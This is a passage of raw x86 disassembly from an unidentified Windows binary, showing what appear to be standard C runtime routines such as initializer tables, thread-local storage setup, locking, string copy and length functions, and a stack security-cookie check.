  423681:	jae    0x4236a5
  423683:	and    DWORD PTR [ebp-0x4],0x0
  423687:	mov    eax,DWORD PTR [ebp-0x1c]
  42368a:	mov    eax,DWORD PTR [eax]
  42368c:	test   eax,eax
  42368e:	je     0x42369b
  423690:	call   eax
  423692:	jmp    0x42369b
  423694:	xor    eax,eax
  423696:	inc    eax
  423697:	ret    
  423698:	mov    esp,DWORD PTR [ebp-0x18]
  42369b:	or     DWORD PTR [ebp-0x4],0xffffffff
  42369f:	add    DWORD PTR [ebp-0x1c],0x4
  4236a3:	jmp    0x42367a
  4236a5:	call   0x423893
  4236aa:	ret    
  4236ab:	push   0xc
  4236ad:	push   0x4284b0
  4236b2:	call   0x423858
  4236b7:	mov    DWORD PTR [ebp-0x1c],0x428f00
  4236be:	cmp    DWORD PTR [ebp-0x1c],0x428f00
  4236c5:	jae    0x4236e9
  4236c7:	and    DWORD PTR [ebp-0x4],0x0
  4236cb:	mov    eax,DWORD PTR [ebp-0x1c]
  4236ce:	mov    eax,DWORD PTR [eax]
  4236d0:	test   eax,eax
  4236d2:	je     0x4236df
  4236d4:	call   eax
  4236d6:	jmp    0x4236df
  4236d8:	xor    eax,eax
  4236da:	inc    eax
  4236db:	ret    
  4236dc:	mov    esp,DWORD PTR [ebp-0x18]
  4236df:	or     DWORD PTR [ebp-0x4],0xffffffff
  4236e3:	add    DWORD PTR [ebp-0x1c],0x4
  4236e7:	jmp    0x4236be
  4236e9:	call   0x423893
  4236ee:	ret    
  4236ef:	call   0x423936
  4236f4:	mov    eax,ds:0x45c304
  4236f9:	cmp    eax,0xffffffff
  4236fc:	je     0x42370c
  4236fe:	push   eax
  4236ff:	call   DWORD PTR ds:0x428064
  423705:	or     DWORD PTR ds:0x45c304,0xffffffff
  42370c:	ret    
  42370d:	push   ebx
  42370e:	push   esi
  42370f:	call   DWORD PTR ds:0x428010
  423715:	push   DWORD PTR ds:0x45c304
  42371b:	mov    ebx,eax
  42371d:	call   DWORD PTR ds:0x428074
  423723:	mov    esi,eax
  423725:	test   esi,esi
  423727:	jne    0x423772
  423729:	push   0x88
  42372e:	push   0x1
  423730:	call   0x424978
  423735:	mov    esi,eax
  423737:	test   esi,esi
  423739:	pop    ecx
  42373a:	pop    ecx
  42373b:	je     0x42376a
  42373d:	push   esi
  42373e:	push   DWORD PTR ds:0x45c304
  423744:	call   DWORD PTR ds:0x428070
  42374a:	test   eax,eax
  42374c:	je     0x42376a
  42374e:	mov    DWORD PTR [esi+0x54],0x45c258
  423755:	mov    DWORD PTR [esi+0x14],0x1
  42375c:	call   DWORD PTR ds:0x42806c
  423762:	or     DWORD PTR [esi+0x4],0xffffffff
  423766:	mov    DWORD PTR [esi],eax
  423768:	jmp    0x423772
  42376a:	push   0x10
  42376c:	call   0x422920
  423771:	pop    ecx
  423772:	push   ebx
  423773:	call   DWORD PTR ds:0x428068
  423779:	mov    eax,esi
  42377b:	pop    esi
  42377c:	pop    ebx
  42377d:	ret    
  42377e:	call   0x4238ed
  423783:	test   eax,eax
  423785:	je     0x423797
  423787:	call   DWORD PTR ds:0x428078
  42378d:	cmp    eax,0xffffffff
  423790:	mov    ds:0x45c304,eax
  423795:	jne    0x42379f
  423797:	call   0x4236ef
  42379c:	xor    eax,eax
  42379e:	ret    
  42379f:	push   esi
  4237a0:	push   0x88
  4237a5:	push   0x1
  4237a7:	call   0x424978
  4237ac:	mov    esi,eax
  4237ae:	test   esi,esi
  4237b0:	pop    ecx
  4237b1:	pop    ecx
  4237b2:	je     0x4237e4
  4237b4:	push   esi
  4237b5:	push   DWORD PTR ds:0x45c304
  4237bb:	call   DWORD PTR ds:0x428070
  4237c1:	test   eax,eax
  4237c3:	je     0x4237e4
  4237c5:	mov    DWORD PTR [esi+0x54],0x45c258
  4237cc:	mov    DWORD PTR [esi+0x14],0x1
  4237d3:	call   DWORD PTR ds:0x42806c
  4237d9:	or     DWORD PTR [esi+0x4],0xffffffff
  4237dd:	mov    DWORD PTR [esi],eax
  4237df:	xor    eax,eax
  4237e1:	inc    eax
  4237e2:	pop    esi
  4237e3:	ret    
  4237e4:	call   0x4236ef
  4237e9:	xor    eax,eax
  4237eb:	pop    esi
  4237ec:	ret    
  4237ed:	cmp    DWORD PTR ds:0x45cac4,0x2
  4237f4:	jne    0x423803
  4237f6:	cmp    DWORD PTR ds:0x45cad0,0x5
  4237fd:	jb     0x423803
  4237ff:	xor    eax,eax
  423801:	inc    eax
  423802:	ret    
  423803:	push   0x3
  423805:	pop    eax
  423806:	ret    
  423807:	xor    eax,eax
  423809:	cmp    DWORD PTR [esp+0x4],eax
  42380d:	push   0x0
  42380f:	sete   al
  423812:	push   0x1000
  423817:	push   eax
  423818:	call   DWORD PTR ds:0x428080
  42381e:	test   eax,eax
  423820:	mov    ds:0x45d140,eax
  423825:	je     0x423851
  423827:	call   0x4237ed
  42382c:	cmp    eax,0x3
  42382f:	mov    ds:0x45d144,eax
  423834:	jne    0x423854
  423836:	push   0x3f8
  42383b:	call   0x424bfa
  423840:	test   eax,eax
  423842:	pop    ecx
  423843:	jne    0x423854
  423845:	push   DWORD PTR ds:0x45d140
  42384b:	call   DWORD PTR ds:0x42807c
  423851:	xor    eax,eax
  423853:	ret    
  423854:	xor    eax,eax
  423856:	inc    eax
  423857:	ret    
  423858:	push   0x425728
  42385d:	mov    eax,fs:0x0
  423863:	push   eax
  423864:	mov    eax,DWORD PTR [esp+0x10]
  423868:	mov    DWORD PTR [esp+0x10],ebp
  42386c:	lea    ebp,[esp+0x10]
  423870:	sub    esp,eax
  423872:	push   ebx
  423873:	push   esi
  423874:	push   edi
  423875:	mov    eax,DWORD PTR [ebp-0x8]
  423878:	mov    DWORD PTR [ebp-0x18],esp
  42387b:	push   eax
  42387c:	mov    eax,DWORD PTR [ebp-0x4]
  42387f:	mov    DWORD PTR [ebp-0x4],0xffffffff
  423886:	mov    DWORD PTR [ebp-0x8],eax
  423889:	lea    eax,[ebp-0x10]
  42388c:	mov    fs:0x0,eax
  423892:	ret    
  423893:	mov    ecx,DWORD PTR [ebp-0x10]
  423896:	mov    DWORD PTR fs:0x0,ecx
  42389d:	pop    ecx
  42389e:	pop    edi
  42389f:	pop    esi
  4238a0:	pop    ebx
  4238a1:	leave  
  4238a2:	push   ecx
  4238a3:	ret    
  4238a4:	int3   
  4238a5:	int3   
  4238a6:	int3   
  4238a7:	int3   
  4238a8:	int3   
  4238a9:	int3   
  4238aa:	int3   
  4238ab:	int3   
  4238ac:	int3   
  4238ad:	int3   
  4238ae:	int3   
  4238af:	int3   
  4238b0:	cmp    eax,0x1000
  4238b5:	jae    0x4238c5
  4238b7:	neg    eax
  4238b9:	add    eax,esp
  4238bb:	add    eax,0x4
  4238be:	test   DWORD PTR [eax],eax
  4238c0:	xchg   esp,eax
  4238c1:	mov    eax,DWORD PTR [eax]
  4238c3:	push   eax
  4238c4:	ret    
  4238c5:	push   ecx
  4238c6:	lea    ecx,[esp+0x8]
  4238ca:	sub    ecx,0x1000
  4238d0:	sub    eax,0x1000
  4238d5:	test   DWORD PTR [ecx],eax
  4238d7:	cmp    eax,0x1000
  4238dc:	jae    0x4238ca
  4238de:	sub    ecx,eax
  4238e0:	mov    eax,esp
  4238e2:	test   DWORD PTR [ecx],eax
  4238e4:	mov    esp,ecx
  4238e6:	mov    ecx,DWORD PTR [eax]
  4238e8:	mov    eax,DWORD PTR [eax+0x4]
  4238eb:	push   eax
  4238ec:	ret    
  4238ed:	push   esi
  4238ee:	push   edi
  4238ef:	xor    esi,esi
  4238f1:	mov    edi,0x45cc20
  4238f6:	cmp    DWORD PTR [esi*8+0x45c314],0x1
  4238fe:	jne    0x42391e
  423900:	lea    eax,[esi*8+0x45c310]
  423907:	mov    DWORD PTR [eax],edi
  423909:	push   0xfa0
  42390e:	push   DWORD PTR [eax]
  423910:	add    edi,0x18
  423913:	call   0x4248ed
  423918:	test   eax,eax
  42391a:	pop    ecx
  42391b:	pop    ecx
  42391c:	je     0x42392a
  42391e:	inc    esi
  42391f:	cmp    esi,0x24
  423922:	jl     0x4238f6
  423924:	xor    eax,eax
  423926:	inc    eax
  423927:	pop    edi
  423928:	pop    esi
  423929:	ret    
  42392a:	and    DWORD PTR [esi*8+0x45c310],0x0
  423932:	xor    eax,eax
  423934:	jmp    0x423927
  423936:	push   ebx
  423937:	mov    ebx,DWORD PTR ds:0x428060
  42393d:	push   esi
  42393e:	mov    esi,0x45c310
  423943:	push   edi
  423944:	mov    edi,DWORD PTR [esi]
  423946:	test   edi,edi
  423948:	je     0x42395d
  42394a:	cmp    DWORD PTR [esi+0x4],0x1
  42394e:	je     0x42395d
  423950:	push   edi
  423951:	call   ebx
  423953:	push   edi
  423954:	call   0x42446a
  423959:	and    DWORD PTR [esi],0x0
  42395c:	pop    ecx
  42395d:	add    esi,0x8
  423960:	cmp    esi,0x45c430
  423966:	jl     0x423944
  423968:	mov    esi,0x45c310
  42396d:	pop    edi
  42396e:	mov    eax,DWORD PTR [esi]
  423970:	test   eax,eax
  423972:	je     0x42397d
  423974:	cmp    DWORD PTR [esi+0x4],0x1
  423978:	jne    0x42397d
  42397a:	push   eax
  42397b:	call   ebx
  42397d:	add    esi,0x8
  423980:	cmp    esi,0x45c430
  423986:	jl     0x42396e
  423988:	pop    esi
  423989:	pop    ebx
  42398a:	ret    
  42398b:	push   ebp
  42398c:	mov    ebp,esp
  42398e:	mov    eax,DWORD PTR [ebp+0x8]
  423991:	push   DWORD PTR [eax*8+0x45c310]
  423998:	call   DWORD PTR ds:0x42808c
  42399e:	pop    ebp
  42399f:	ret    
  4239a0:	push   ebp
  4239a1:	mov    ebp,esp
  4239a3:	push   esi
  4239a4:	mov    esi,DWORD PTR [ebp+0x8]
  4239a7:	lea    esi,[esi*8+0x45c310]
  4239ae:	cmp    DWORD PTR [esi],0x0
  4239b1:	je     0x4239b8
  4239b3:	xor    eax,eax
  4239b5:	inc    eax
  4239b6:	jmp    0x423a1c
  4239b8:	push   edi
  4239b9:	push   0x18
  4239bb:	call   0x424582
  4239c0:	mov    edi,eax
  4239c2:	test   edi,edi
  4239c4:	pop    ecx
  4239c5:	jne    0x4239d6
  4239c7:	call   0x425800
  4239cc:	mov    DWORD PTR [eax],0xc
  4239d2:	xor    eax,eax
  4239d4:	jmp    0x423a1b
  4239d6:	push   0xa
  4239d8:	call   0x423a1f
  4239dd:	cmp    DWORD PTR [esi],0x0
  4239e0:	pop    ecx
  4239e1:	jne    0x423a09
  4239e3:	push   0xfa0
  4239e8:	push   edi
  4239e9:	call   0x4248ed
  4239ee:	test   eax,eax
  4239f0:	pop    ecx
  4239f1:	pop    ecx
  4239f2:	jne    0x423a05
  4239f4:	push   edi
  4239f5:	call   0x42446a
  4239fa:	push   0xa
  4239fc:	call   0x42398b
  423a01:	pop    ecx
  423a02:	pop    ecx
  423a03:	jmp    0x4239c7
  423a05:	mov    DWORD PTR [esi],edi
  423a07:	jmp    0x423a10
  423a09:	push   edi
  423a0a:	call   0x42446a
  423a0f:	pop    ecx
  423a10:	push   0xa
  423a12:	call   0x42398b
  423a17:	xor    eax,eax
  423a19:	pop    ecx
  423a1a:	inc    eax
  423a1b:	pop    edi
  423a1c:	pop    esi
  423a1d:	pop    ebp
  423a1e:	ret    
  423a1f:	push   ebp
  423a20:	mov    ebp,esp
  423a22:	mov    eax,DWORD PTR [ebp+0x8]
  423a25:	push   esi
  423a26:	lea    esi,[eax*8+0x45c310]
  423a2d:	cmp    DWORD PTR [esi],0x0
  423a30:	jne    0x423a45
  423a32:	push   eax
  423a33:	call   0x4239a0
  423a38:	test   eax,eax
  423a3a:	pop    ecx
  423a3b:	jne    0x423a45
  423a3d:	push   0x11
  423a3f:	call   0x422920
  423a44:	pop    ecx
  423a45:	push   DWORD PTR [esi]
  423a47:	call   DWORD PTR ds:0x428090
  423a4d:	pop    esi
  423a4e:	pop    ebp
  423a4f:	ret    
  423a50:	push   esi
  423a51:	push   DWORD PTR ds:0x45d268
  423a57:	call   0x4259b6
  423a5c:	pop    ecx
  423a5d:	mov    ecx,DWORD PTR ds:0x45d264
  423a63:	mov    esi,eax
  423a65:	mov    eax,ds:0x45d268
  423a6a:	mov    edx,ecx
  423a6c:	sub    edx,eax
  423a6e:	add    edx,0x4
  423a71:	cmp    esi,edx
  423a73:	jae    0x423ac3
  423a75:	mov    ecx,0x800
  423a7a:	cmp    esi,ecx
  423a7c:	jae    0x423a80
  423a7e:	mov    ecx,esi
  423a80:	add    ecx,esi
  423a82:	push   ecx
  423a83:	push   eax
  423a84:	call   0x425809
  423a89:	test   eax,eax
  423a8b:	pop    ecx
  423a8c:	pop    ecx
  423a8d:	jne    0x423aa6
  423a8f:	add    esi,0x10
  423a92:	push   esi
  423a93:	push   DWORD PTR ds:0x45d268
  423a99:	call   0x425809
  423a9e:	test   eax,eax
  423aa0:	pop    ecx
  423aa1:	pop    ecx
  423aa2:	jne    0x423aa6
  423aa4:	pop    esi
  423aa5:	ret    
  423aa6:	mov    ecx,DWORD PTR ds:0x45d264
  423aac:	sub    ecx,DWORD PTR ds:0x45d268
  423ab2:	mov    ds:0x45d268,eax
  423ab7:	sar    ecx,0x2
  423aba:	lea    ecx,[eax+ecx*4]
  423abd:	mov    DWORD PTR ds:0x45d264,ecx
  423ac3:	mov    DWORD PTR [ecx],edi
  423ac5:	add    DWORD PTR ds:0x45d264,0x4
  423acc:	mov    eax,edi
  423ace:	pop    esi
  423acf:	ret    
  423ad0:	push   0x80
  423ad5:	call   0x424582
  423ada:	test   eax,eax
  423adc:	pop    ecx
  423add:	mov    ds:0x45d268,eax
  423ae2:	jne    0x423ae8
  423ae4:	push   0x18
  423ae6:	pop    eax
  423ae7:	ret    
  423ae8:	and    DWORD PTR [eax],0x0
  423aeb:	mov    eax,ds:0x45d268
  423af0:	mov    ds:0x45d264,eax
  423af5:	xor    eax,eax
  423af7:	ret    
  423af8:	push   0xc
  423afa:	push   0x4284c0
  423aff:	call   0x423858
  423b04:	call   0x422b6b
  423b09:	and    DWORD PTR [ebp-0x4],0x0
  423b0d:	mov    edi,DWORD PTR [ebp+0x8]
  423b10:	call   0x423a50
  423b15:	mov    DWORD PTR [ebp-0x1c],eax
  423b18:	or     DWORD PTR [ebp-0x4],0xffffffff
  423b1c:	call   0x423b2a
  423b21:	mov    eax,DWORD PTR [ebp-0x1c]
  423b24:	call   0x423893
  423b29:	ret    
  423b2a:	call   0x422b74
  423b2f:	ret    
  423b30:	push   DWORD PTR [esp+0x4]
  423b34:	call   0x423af8
  423b39:	neg    eax
  423b3b:	sbb    eax,eax
  423b3d:	neg    eax
  423b3f:	pop    ecx
  423b40:	dec    eax
  423b41:	ret    
  423b42:	push   ebp
  423b43:	mov    ebp,esp
  423b45:	sub    esp,0x10
  423b48:	push   ebx
  423b49:	xor    ebx,ebx
  423b4b:	cmp    DWORD PTR ds:0x45cd70,ebx
  423b51:	push   esi
  423b52:	push   edi
  423b53:	jne    0x423bc2
  423b55:	push   0x428530
  423b5a:	call   DWORD PTR ds:0x428094
  423b60:	mov    edi,eax
  423b62:	cmp    edi,ebx
  423b64:	je     0x423bfd
  423b6a:	mov    esi,DWORD PTR ds:0x428018
  423b70:	push   0x428524
  423b75:	push   edi
  423b76:	call   esi
  423b78:	test   eax,eax
  423b7a:	mov    ds:0x45cd70,eax
  423b7f:	je     0x423bfd
  423b81:	push   0x428514
  423b86:	push   edi
  423b87:	call   esi
  423b89:	push   0x428500
  423b8e:	push   edi
  423b8f:	mov    ds:0x45cd74,eax
  423b94:	call   esi
  423b96:	cmp    DWORD PTR ds:0x45cac4,0x2
  423b9d:	mov    ds:0x45cd78,eax
  423ba2:	jne    0x423bc2
  423ba4:	push   0x4284e4
  423ba9:	push   edi
  423baa:	call   esi
  423bac:	test   eax,eax
  423bae:	mov    ds:0x45cd80,eax
  423bb3:	je     0x423bc2
  423bb5:	push   0x4284cc
  423bba:	push   edi
  423bbb:	call   esi
  423bbd:	mov    ds:0x45cd7c,eax
  423bc2:	mov    eax,ds:0x45cd7c
  423bc7:	test   eax,eax
  423bc9:	je     0x423c07
  423bcb:	call   eax
  423bcd:	test   eax,eax
  423bcf:	je     0x423bee
  423bd1:	lea    ecx,[ebp-0x4]
  423bd4:	push   ecx
  423bd5:	push   0xc
  423bd7:	lea    ecx,[ebp-0x10]
  423bda:	push   ecx
  423bdb:	push   0x1
  423bdd:	push   eax
  423bde:	call   DWORD PTR ds:0x45cd80
  423be4:	test   eax,eax
  423be6:	je     0x423bee
  423be8:	test   BYTE PTR [ebp-0x8],0x1
  423bec:	jne    0x423c07
  423bee:	cmp    DWORD PTR ds:0x45cad0,0x4
  423bf5:	jb     0x423c01
  423bf7:	or     BYTE PTR [ebp+0x12],0x20
  423bfb:	jmp    0x423c26
  423bfd:	xor    eax,eax
  423bff:	jmp    0x423c36
  423c01:	or     BYTE PTR [ebp+0x12],0x4
  423c05:	jmp    0x423c26
  423c07:	mov    eax,ds:0x45cd74
  423c0c:	test   eax,eax
  423c0e:	je     0x423c26
  423c10:	call   eax
  423c12:	mov    ebx,eax
  423c14:	test   ebx,ebx
  423c16:	je     0x423c26
  423c18:	mov    eax,ds:0x45cd78
  423c1d:	test   eax,eax
  423c1f:	je     0x423c26
  423c21:	push   ebx
  423c22:	call   eax
  423c24:	mov    ebx,eax
  423c26:	push   DWORD PTR [ebp+0x10]
  423c29:	push   DWORD PTR [ebp+0xc]
  423c2c:	push   DWORD PTR [ebp+0x8]
  423c2f:	push   ebx
  423c30:	call   DWORD PTR ds:0x45cd70
  423c36:	pop    edi
  423c37:	pop    esi
  423c38:	pop    ebx
  423c39:	leave  
  423c3a:	ret    
  423c3b:	int3   
  423c3c:	int3   
  423c3d:	int3   
  423c3e:	int3   
  423c3f:	int3   
  423c40:	push   edi
  423c41:	mov    edi,DWORD PTR [esp+0x8]
  423c45:	jmp    0x423cb5
  423c47:	lea    esp,[esp+0x0]
  423c4e:	mov    edi,edi
  423c50:	mov    ecx,DWORD PTR [esp+0x4]
  423c54:	push   edi
  423c55:	test   ecx,0x3
  423c5b:	je     0x423c70
  423c5d:	mov    al,BYTE PTR [ecx]
  423c5f:	add    ecx,0x1
  423c62:	test   al,al
  423c64:	je     0x423ca3
  423c66:	test   ecx,0x3
  423c6c:	jne    0x423c5d
  423c6e:	mov    edi,edi
  423c70:	mov    eax,DWORD PTR [ecx]
  423c72:	mov    edx,0x7efefeff
  423c77:	add    edx,eax
  423c79:	xor    eax,0xffffffff
  423c7c:	xor    eax,edx
  423c7e:	add    ecx,0x4
  423c81:	test   eax,0x81010100
  423c86:	je     0x423c70
  423c88:	mov    eax,DWORD PTR [ecx-0x4]
  423c8b:	test   al,al
  423c8d:	je     0x423cb2
  423c8f:	test   ah,ah
  423c91:	je     0x423cad
  423c93:	test   eax,0xff0000
  423c98:	je     0x423ca8
  423c9a:	test   eax,0xff000000
  423c9f:	je     0x423ca3
  423ca1:	jmp    0x423c70
  423ca3:	lea    edi,[ecx-0x1]
  423ca6:	jmp    0x423cb5
  423ca8:	lea    edi,[ecx-0x2]
  423cab:	jmp    0x423cb5
  423cad:	lea    edi,[ecx-0x3]
  423cb0:	jmp    0x423cb5
  423cb2:	lea    edi,[ecx-0x4]
  423cb5:	mov    ecx,DWORD PTR [esp+0xc]
  423cb9:	test   ecx,0x3
  423cbf:	je     0x423cde
  423cc1:	mov    dl,BYTE PTR [ecx]
  423cc3:	add    ecx,0x1
  423cc6:	test   dl,dl
  423cc8:	je     0x423d30
  423cca:	mov    BYTE PTR [edi],dl
  423ccc:	add    edi,0x1
  423ccf:	test   ecx,0x3
  423cd5:	jne    0x423cc1
  423cd7:	jmp    0x423cde
  423cd9:	mov    DWORD PTR [edi],edx
  423cdb:	add    edi,0x4
  423cde:	mov    edx,0x7efefeff
  423ce3:	mov    eax,DWORD PTR [ecx]
  423ce5:	add    edx,eax
  423ce7:	xor    eax,0xffffffff
  423cea:	xor    eax,edx
  423cec:	mov    edx,DWORD PTR [ecx]
  423cee:	add    ecx,0x4
  423cf1:	test   eax,0x81010100
  423cf6:	je     0x423cd9
  423cf8:	test   dl,dl
  423cfa:	je     0x423d30
  423cfc:	test   dh,dh
  423cfe:	je     0x423d27
  423d00:	test   edx,0xff0000
  423d06:	je     0x423d1a
  423d08:	test   edx,0xff000000
  423d0e:	je     0x423d12
  423d10:	jmp    0x423cd9
  423d12:	mov    DWORD PTR [edi],edx
  423d14:	mov    eax,DWORD PTR [esp+0x8]
  423d18:	pop    edi
  423d19:	ret    
  423d1a:	mov    WORD PTR [edi],dx
  423d1d:	mov    eax,DWORD PTR [esp+0x8]
  423d21:	mov    BYTE PTR [edi+0x2],0x0
  423d25:	pop    edi
  423d26:	ret    
  423d27:	mov    WORD PTR [edi],dx
  423d2a:	mov    eax,DWORD PTR [esp+0x8]
  423d2e:	pop    edi
  423d2f:	ret    
  423d30:	mov    BYTE PTR [edi],dl
  423d32:	mov    eax,DWORD PTR [esp+0x8]
  423d36:	pop    edi
  423d37:	ret    
  423d38:	int3   
  423d39:	int3   
  423d3a:	int3   
  423d3b:	int3   
  423d3c:	int3   
  423d3d:	int3   
  423d3e:	int3   
  423d3f:	int3   
  423d40:	mov    ecx,DWORD PTR [esp+0xc]
  423d44:	push   edi
  423d45:	test   ecx,ecx
  423d47:	je     0x423ddf
  423d4d:	push   esi
  423d4e:	push   ebx
  423d4f:	mov    ebx,ecx
  423d51:	mov    esi,DWORD PTR [esp+0x14]
  423d55:	test   esi,0x3
  423d5b:	mov    edi,DWORD PTR [esp+0x10]
  423d5f:	jne    0x423d6c
  423d61:	shr    ecx,0x2
  423d64:	jne    0x423def
  423d6a:	jmp    0x423d93
  423d6c:	mov    al,BYTE PTR [esi]
  423d6e:	add    esi,0x1
  423d71:	mov    BYTE PTR [edi],al
  423d73:	add    edi,0x1
  423d76:	sub    ecx,0x1
  423d79:	je     0x423da6
  423d7b:	test   al,al
  423d7d:	je     0x423dae
  423d7f:	test   esi,0x3
  423d85:	jne    0x423d6c
  423d87:	mov    ebx,ecx
  423d89:	shr    ecx,0x2
  423d8c:	jne    0x423def
  423d8e:	and    ebx,0x3
  423d91:	je     0x423da6
  423d93:	mov    al,BYTE PTR [esi]
  423d95:	add    esi,0x1
  423d98:	mov    BYTE PTR [edi],al
  423d9a:	add    edi,0x1
  423d9d:	test   al,al
  423d9f:	je     0x423dd8
  423da1:	sub    ebx,0x1
  423da4:	jne    0x423d93
  423da6:	mov    eax,DWORD PTR [esp+0x10]
  423daa:	pop    ebx
  423dab:	pop    esi
  423dac:	pop    edi
  423dad:	ret    
  423dae:	test   edi,0x3
  423db4:	je     0x423dcc
  423db6:	mov    BYTE PTR [edi],al
  423db8:	add    edi,0x1
  423dbb:	sub    ecx,0x1
  423dbe:	je     0x423e5c
  423dc4:	test   edi,0x3
  423dca:	jne    0x423db6
  423dcc:	mov    ebx,ecx
  423dce:	shr    ecx,0x2
  423dd1:	jne    0x423e47
  423dd3:	mov    BYTE PTR [edi],al
  423dd5:	add    edi,0x1
  423dd8:	sub    ebx,0x1
  423ddb:	jne    0x423dd3
  423ddd:	pop    ebx
  423dde:	pop    esi
  423ddf:	mov    eax,DWORD PTR [esp+0x8]
  423de3:	pop    edi
  423de4:	ret    
  423de5:	mov    DWORD PTR [edi],edx
  423de7:	add    edi,0x4
  423dea:	sub    ecx,0x1
  423ded:	je     0x423d8e
  423def:	mov    edx,0x7efefeff
  423df4:	mov    eax,DWORD PTR [esi]
  423df6:	add    edx,eax
  423df8:	xor    eax,0xffffffff
  423dfb:	xor    eax,edx
  423dfd:	mov    edx,DWORD PTR [esi]
  423dff:	add    esi,0x4
  423e02:	test   eax,0x81010100
  423e07:	je     0x423de5
  423e09:	test   dl,dl
  423e0b:	je     0x423e39
  423e0d:	test   dh,dh
  423e0f:	je     0x423e2f
  423e11:	test   edx,0xff0000
  423e17:	je     0x423e25
  423e19:	test   edx,0xff000000
  423e1f:	jne    0x423de5
  423e21:	mov    DWORD PTR [edi],edx
  423e23:	jmp    0x423e3d
  423e25:	and    edx,0xffff
  423e2b:	mov    DWORD PTR [edi],edx
  423e2d:	jmp    0x423e3d
  423e2f:	and    edx,0xff
  423e35:	mov    DWORD PTR [edi],edx
  423e37:	jmp    0x423e3d
  423e39:	xor    edx,edx
  423e3b:	mov    DWORD PTR [edi],edx
  423e3d:	add    edi,0x4
  423e40:	xor    eax,eax
  423e42:	sub    ecx,0x1
  423e45:	je     0x423e53
  423e47:	xor    eax,eax
  423e49:	mov    DWORD PTR [edi],eax
  423e4b:	add    edi,0x4
  423e4e:	sub    ecx,0x1
  423e51:	jne    0x423e49
  423e53:	and    ebx,0x3
  423e56:	jne    0x423dd3
  423e5c:	mov    eax,DWORD PTR [esp+0x10]
  423e60:	pop    ebx
  423e61:	pop    esi
  423e62:	pop    edi
  423e63:	ret    
  423e64:	int3   
  423e65:	int3   
  423e66:	int3   
  423e67:	int3   
  423e68:	int3   
  423e69:	int3   
  423e6a:	int3   
  423e6b:	int3   
  423e6c:	int3   
  423e6d:	int3   
  423e6e:	int3   
  423e6f:	int3   
  423e70:	mov    ecx,DWORD PTR [esp+0x4]
  423e74:	test   ecx,0x3
  423e7a:	je     0x423ea0
  423e7c:	mov    al,BYTE PTR [ecx]
  423e7e:	add    ecx,0x1
  423e81:	test   al,al
  423e83:	je     0x423ed3
  423e85:	test   ecx,0x3
  423e8b:	jne    0x423e7c
  423e8d:	add    eax,0x0
  423e92:	lea    esp,[esp+0x0]
  423e99:	lea    esp,[esp+0x0]
  423ea0:	mov    eax,DWORD PTR [ecx]
  423ea2:	mov    edx,0x7efefeff
  423ea7:	add    edx,eax
  423ea9:	xor    eax,0xffffffff
  423eac:	xor    eax,edx
  423eae:	add    ecx,0x4
  423eb1:	test   eax,0x81010100
  423eb6:	je     0x423ea0
  423eb8:	mov    eax,DWORD PTR [ecx-0x4]
  423ebb:	test   al,al
  423ebd:	je     0x423ef1
  423ebf:	test   ah,ah
  423ec1:	je     0x423ee7
  423ec3:	test   eax,0xff0000
  423ec8:	je     0x423edd
  423eca:	test   eax,0xff000000
  423ecf:	je     0x423ed3
  423ed1:	jmp    0x423ea0
  423ed3:	lea    eax,[ecx-0x1]
  423ed6:	mov    ecx,DWORD PTR [esp+0x4]
  423eda:	sub    eax,ecx
  423edc:	ret    
  423edd:	lea    eax,[ecx-0x2]
  423ee0:	mov    ecx,DWORD PTR [esp+0x4]
  423ee4:	sub    eax,ecx
  423ee6:	ret    
  423ee7:	lea    eax,[ecx-0x3]
  423eea:	mov    ecx,DWORD PTR [esp+0x4]
  423eee:	sub    eax,ecx
  423ef0:	ret    
  423ef1:	lea    eax,[ecx-0x4]
  423ef4:	mov    ecx,DWORD PTR [esp+0x4]
  423ef8:	sub    eax,ecx
  423efa:	ret    
  423efb:	push   0x8
  423efd:	push   0x428540
  423f02:	call   0x423858
  423f07:	and    DWORD PTR [ebp-0x4],0x0
  423f0b:	push   0x0
  423f0d:	push   0x1
  423f0f:	call   0x425a82
  423f14:	pop    ecx
  423f15:	pop    ecx
  423f16:	jmp    0x423f1f
  423f18:	xor    eax,eax
  423f1a:	inc    eax
  423f1b:	ret    
  423f1c:	mov    esp,DWORD PTR [ebp-0x18]
  423f1f:	or     DWORD PTR [ebp-0x4],0xffffffff
  423f23:	push   0x3
  423f25:	call   DWORD PTR ds:0x428028
  423f2b:	int3   
  423f2c:	cmp    ecx,DWORD PTR ds:0x45c430
  423f32:	jne    0x423f35
  423f34:	ret    
  423f35:	jmp    0x423efb
  423f3a:	movzx  eax,BYTE PTR [esp+0x4]
  423f3f:	mov    cl,BYTE PTR [esp+0xc]
  423f43:	test   BYTE PTR [eax+0x45cf21],cl
  423f49:	jne    0x423f67
  423f4b:	cmp    DWORD PTR [esp+0x8],0x0
  423f50:	je     0x423f60
  423f52:	movzx  eax,WORD PTR [eax*2+0x42893a]
  423f5a:	and    eax,DWORD PTR [esp+0x8]
  423f5e:	jmp    0x423f62
  423f60:	xor    eax,eax
  423f62:	test   eax,eax
  423f64:	jne    0x423f67
  423f66:	ret    
  423f67:	xor    eax,eax
  423f69:	inc    eax
  423f6a:	ret    
  423f6b:	push   0x4
  423f6d:	push   0x0
  423f6f:	push   DWORD PTR [esp+0xc]
  423f73:	call   0x423f3a
  423f78:	add    esp,0xc
  423f7b:	ret    
  423f7c:	sub    eax,0x3a4
  423f81:	je     0x423fa5
  423f83:	sub    eax,0x4
  423f86:	je     0x423f9f
  423f88:	sub    eax,0xd
  423f8b:	je     0x423f99
  423f8d:	dec    eax
  423f8e:	je     0x423f93
  423f90:	xor    eax,eax
  423f92:	ret    
  423f93:	mov    eax,0x404
  423f98:	ret    
  423f99:	mov    eax,0x412
  423f9e:	ret    
  423f9f:	mov    eax,0x804
  423fa4:	ret    
  423fa5:	mov    eax,0x411
  423faa:	ret    
  423fab:	push   edi
  423fac:	push   0x40
  423fae:	xor    eax,eax
  423fb0:	pop    ecx
  423fb1:	mov    edi,0x45cf20
  423fb6:	rep stos DWORD PTR es:[edi],eax
  423fb8:	stos   BYTE PTR es:[edi],al
  423fb9:	xor    eax,eax
  423fbb:	mov    ds:0x45d024,eax
  423fc0:	mov    ds:0x45cf1c,eax
  423fc5:	mov    ds:0x45cf14,eax
  423fca:	mov    edi,0x45d030
  423fcf:	stos   DWORD PTR es:[edi],eax
  423fd0:	stos   DWORD PTR es:[edi],eax
  423fd1:	stos   DWORD PTR es:[edi],eax
  423fd2:	pop    edi
  423fd3:	ret    
  423fd4:	push   ebp
  423fd5:	mov    ebp,esp
  423fd7:	sub    esp,0x518
  423fdd:	mov    eax,ds:0x45c430
  423fe2:	xor    eax,DWORD PTR [ebp+0x4]
  423fe5:	push   esi
